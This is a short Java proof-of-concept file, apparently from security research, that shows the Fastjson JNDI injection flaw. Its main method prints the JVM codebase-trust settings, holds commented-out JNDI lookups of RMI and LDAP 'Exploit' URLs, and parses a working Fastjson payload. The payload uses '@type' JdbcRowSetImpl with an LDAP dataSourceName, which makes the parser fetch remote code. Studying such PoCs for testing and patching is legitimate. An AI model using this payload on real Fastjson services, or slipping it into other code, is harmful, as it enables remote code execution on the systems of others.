package fastjsonjndi;

import com.alibaba.fastjson.JSON;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class Victim {
    public static void main(String args[]) throws Exception{


//        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
//        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "false");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");

        System.out.println("java.rmi.server.codebase:"+System.getProperty("java.rmi.server.codebase"));
        System.out.println("java.rmi.server.useCodebaseOnly:"+System.getProperty("java.rmi.server.useCodebaseOnly"));
        System.out.println("com.sun.jndi.rmi.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.cosnaming.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.cosnaming.object.trustURLCodebase"));
        System.out.println("com.sun.jndi.ldap.object.trustURLCodebase:"+System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));

        /**
         * Test1: JNDI Lookup
         */
        Hashtable env = new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
//        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:8080");
        Context ctx = new InitialContext(env);
//        Object local_obj = ctx.lookup("rmi://10.11.111.111:1099/Exploit");
//        Object local_obj = ctx.lookup("ldap://127.0.0.1:1389/Exploit");




        /**
         * Test2: FastJson PoC
         */
//        System.setProperty("java.rmi.server.hostname","127.0.0.1");
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);

    }
}